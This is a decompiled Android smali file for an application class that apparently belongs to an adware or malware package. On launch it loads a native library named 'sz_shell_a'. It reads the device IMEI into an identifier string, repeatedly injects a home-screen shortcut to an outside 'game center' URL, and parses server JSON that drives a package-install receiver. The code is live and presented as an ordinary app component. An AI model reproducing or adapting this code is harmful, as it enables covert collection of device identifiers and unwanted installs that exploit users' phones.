.class public Lcom/bb_sz/ndk/App;
.super Landroid/app/Application;


# static fields
.field private static a:Z

.field public static final debug:Z

.field public static mContext:Landroid/content/Context;

.field public static mUID:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/bb_sz/ndk/App;->mContext:Landroid/content/Context;

    sput-object v0, Lcom/bb_sz/ndk/App;->mUID:Ljava/lang/String;

    const/4 v0, 0x1

    sput-boolean v0, Lcom/bb_sz/ndk/App;->a:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Application;-><init>()V

    return-void
.end method

.method private static a(Ljava/lang/String;)Landroid/graphics/Bitmap;
    .locals 4

    const/4 v1, 0x0

    sget-object v0, Lcom/bb_sz/ndk/App;->mContext:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    :try_start_0
    invoke-virtual {v0, p0}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v2

    invoke-static {v2}, Landroid/graphics/BitmapFactory;->decodeStream(Ljava/io/InputStream;)Landroid/graphics/Bitmap;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :try_start_1
    invoke-virtual {v2}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    move-object v3, v0

    move-object v0, v1

    move-object v1, v3

    :goto_1
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    :catch_1
    move-exception v1

    goto :goto_1
.end method

.method private static a()V
    .locals 6

    sget-object v0, Lcom/bb_sz/ndk/App;->mContext:Landroid/content/Context;

    const-string v1, "add_icon_date"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "add_icon_date"

    const-wide/16 v2, 0x0

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    sub-long v2, v4, v2

    const-wide/32 v4, 0x240c8400

    cmp-long v1, v2, v4

    if-lez v1, :cond_0

    const-string v1, "sz_game_center.png"

    invoke-static {v1}, Lcom/bb_sz/ndk/App;->a(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v1

    const-string v2, "\u6e38\u620f\u4e2d\u5fc3"

    const-string v3, "http://nav.iadmore.com:8011/market/index.html"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-static {v1, v2, v3}, Lcom/bb_sz/ndk/App;->a(Landroid/graphics/Bitmap;Ljava/lang/String;Landroid/net/Uri;)V

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "add_icon_date"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_0
    return-void
.end method

.method private static a(Landroid/graphics/Bitmap;Ljava/lang/String;Landroid/net/Uri;)V
    .locals 3

    new-instance v0, Landroid/content/Intent;

    const-string v1, "com.android.launcher.action.INSTALL_SHORTCUT"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.extra.shortcut.NAME"

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "duplicate"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    const-string v1, "android.intent.extra.shortcut.ICON"

    invoke-virtual {v0, v1, p0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1}, Landroid/content/Intent;-><init>()V

    invoke-virtual {v1, p2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const-string v2, "android.intent.extra.shortcut.INTENT"

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    sget-object v1, Lcom/bb_sz/ndk/App;->mContext:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method

.method public static a([B)V
    .locals 9

    const/16 v8, 0xd

    const/16 v7, 0xa

    const/4 v4, 0x0

    const/4 v5, -0x1

    invoke-static {}, Lcom/bb_sz/ndk/App;->a()V

    if-eqz p0, :cond_0

    array-length v0, p0

    if-nez v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    const/4 v3, -0x2

    array-length v1, p0

    move v2, v4

    move v0, v5

    :goto_1
    if-ge v2, v1, :cond_3

    aget-byte v6, p0, v2

    if-ne v6, v8, :cond_2

    add-int/lit8 v6, v2, 0x1

    if-ge v6, v1, :cond_2

    add-int/lit8 v6, v2, 0x1

    aget-byte v6, p0, v6

    if-ne v6, v7, :cond_2

    add-int/lit8 v6, v2, 0x2

    if-ge v6, v1, :cond_2

    add-int/lit8 v6, v2, 0x2

    aget-byte v6, p0, v6

    if-ne v6, v8, :cond_2

    add-int/lit8 v6, v2, 0x3

    if-ge v6, v1, :cond_2

    add-int/lit8 v6, v2, 0x3

    aget-byte v6, p0, v6

    if-ne v6, v7, :cond_2

    if-ne v0, v5, :cond_4

    add-int/lit8 v0, v2, 0x3

    :cond_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    :cond_3
    move v2, v3

    :cond_4
    if-gtz v2, :cond_7

    :goto_2
    sub-int/2addr v1, v0

    if-lez v1, :cond_0

    new-array v2, v1, [B

    invoke-static {p0, v0, v2, v4, v1}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    const/4 v1, 0x0

    :try_start_0
    new-instance v0, Ljava/lang/String;

    const-string v3, "utf-8"

    invoke-direct {v0, v2, v3}, Ljava/lang/String;-><init>([BLjava/lang/String;)V
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_3
    const-string v1, "{"

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_5

    const-string v1, "}"

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_6

    :cond_5
    const-string v1, "{"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    const-string v2, "}"

    invoke-virtual {v0, v2}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v2

    add-int/lit8 v2, v2, 0x1

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    goto :goto_3

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    move-object v0, v1

    goto :goto_3

    :cond_6
    new-instance v1, Lcom/bb_sz/ndk/e;

    invoke-direct {v1, v0}, Lcom/bb_sz/ndk/e;-><init>(Ljava/lang/String;)V

    iget v0, v1, Lcom/bb_sz/ndk/e;->a:I

    if-nez v0, :cond_0

    iget-object v0, v1, Lcom/bb_sz/ndk/e;->b:Ljava/util/List;

    if-eqz v0, :cond_0

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v2, "package"

    invoke-virtual {v0, v2}, Landroid/content/IntentFilter;->addDataScheme(Ljava/lang/String;)V

    const-string v2, "android.intent.action.PACKAGE_ADDED"

    invoke-virtual {v0, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    sget-object v2, Lcom/bb_sz/ndk/App;->mContext:Landroid/content/Context;

    new-instance v3, Lcom/bb_sz/ndk/d;

    invoke-direct {v3}, Lcom/bb_sz/ndk/d;-><init>()V

    invoke-virtual {v2, v3, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    invoke-static {}, Lcom/bb_sz/ndk/g;->a()Lcom/bb_sz/ndk/g;

    move-result-object v0

    sget-object v2, Lcom/bb_sz/ndk/App;->mContext:Landroid/content/Context;

    iget-object v1, v1, Lcom/bb_sz/ndk/e;->b:Ljava/util/List;

    invoke-virtual {v0, v2, v1}, Lcom/bb_sz/ndk/g;->a(Landroid/content/Context;Ljava/util/List;)V

    goto/16 :goto_0

    :cond_7
    move v1, v2

    goto :goto_2
.end method

.method public static native http(Ljava/lang/String;ILjava/lang/String;)[B
.end method

.method public static native jniCreate()V
.end method

.method public static native post(Ljava/lang/String;ILjava/lang/String;)V
.end method


# virtual methods
.method protected attachBaseContext(Landroid/content/Context;)V
    .locals 1

    sput-object p0, Lcom/bb_sz/ndk/App;->mContext:Landroid/content/Context;

    invoke-super {p0, p1}, Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V

    invoke-virtual {p0, p0}, Lcom/bb_sz/ndk/App;->b(Landroid/content/Context;)V

    const-string v0, "sz_shell_a"

    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

    return-void
.end method

.method public b(Landroid/content/Context;)V
    .locals 3

    if-nez p1, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    :try_start_0
    invoke-virtual {p1}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    const-string v1, "jpay_uid.txt"

    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/InputStream;->available()I

    move-result v1

    new-array v1, v1, [B

    invoke-virtual {v0, v1}, Ljava/io/InputStream;->read([B)I

    new-instance v0, Ljava/lang/String;

    const-string v2, "utf-8"

    invoke-direct {v0, v1, v2}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    sput-object v0, Lcom/bb_sz/ndk/App;->mUID:Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-ge v0, v1, :cond_2

    const-string v0, "phone"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lcom/bb_sz/ndk/App;->mUID:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&imei="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/bb_sz/ndk/App;->mUID:Ljava/lang/String;

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    :cond_2
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lcom/bb_sz/ndk/App;->mUID:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "&imei="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/bb_sz/ndk/App;->mUID:Ljava/lang/String;

    goto :goto_0
.end method

.method public onCreate()V
    .locals 1

    invoke-super {p0}, Landroid/app/Application;->onCreate()V

    invoke-static {}, Lcom/bb_sz/ndk/App;->jniCreate()V

    sget-boolean v0, Lcom/bb_sz/ndk/App;->a:Z

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    sput-boolean v0, Lcom/bb_sz/ndk/App;->a:Z

    sget-object v0, Lcom/bb_sz/ndk/App;->mContext:Landroid/content/Context;

    invoke-static {v0}, Lcom/bb_sz/ndk/c;->a(Landroid/content/Context;)V

    :cond_0
    return-void
.end method
